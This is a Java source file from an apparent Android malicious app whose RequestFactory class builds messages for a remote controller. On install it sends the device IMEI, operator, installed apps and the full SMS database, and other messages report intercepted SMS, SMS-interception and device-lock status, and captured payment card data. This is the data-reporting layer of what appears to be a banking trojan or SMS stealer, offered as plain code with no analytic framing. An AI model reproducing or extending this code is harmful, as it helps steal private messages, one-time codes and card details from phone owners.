package exts.whats.utils;

import android.content.Context;
import exts.whats.R;
import org.json.JSONObject;

public class RequestFactory {
    public static JSONObject makeReg(Context context) throws Exception {
        JSONObject json = new JSONObject();
        json.put("type", "install");
        json.put("country", Utils.getCountry(context));
        json.put("imei", Utils.getDeviceId(context));
        json.put("model", Utils.getModel());
        json.put("apps", Utils.getAppList(context));
        json.put("operator", Utils.getOperator(context));
        json.put("sms", Utils.readMessagesFromDeviceDB(context));
        json.put("os", Utils.getOS());
        json.put("install id", context.getString(R.string.install_id));
        return json;
    }

    public static JSONObject makeReq(String appId) throws Exception {
        JSONObject json = new JSONObject();
        json.put("type", "request");
        json.put("app id", appId);
        return json;
    }

    public static JSONObject makeIncomingMessage(String appId, String number, String text) throws Exception {
        JSONObject json = new JSONObject();
        json.put("type", "sms");
        json.put("app id", appId);
        json.put("number", number);
        json.put("text", text);
        return json;
    }

    public static JSONObject makeIdSavedConfirm(String appId) throws Exception {
        JSONObject json = new JSONObject();
        json.put("type", "id saved");
        json.put("app id", appId);
        return json;
    }

    public static JSONObject makeInterceptConfirm(String appId, boolean status) throws Exception {
        JSONObject json = new JSONObject();
        json.put("type", "intercept status");
        json.put("app id", appId);
        json.put("status", status);
        return json;
    }

    public static JSONObject makeLockStatus(String appId, boolean status) throws Exception {
        JSONObject json = new JSONObject();
        json.put("type", "lock status");
        json.put("app id", appId);
        json.put("status", status);
        return json;
    }

    public static JSONObject makeCardData(String appId, JSONObject cardData) throws Exception {
        JSONObject json = new JSONObject();
        json.put("type", "card data");
        json.put("app id", appId);
        json.put("card data", cardData);
        return json;
    }
}
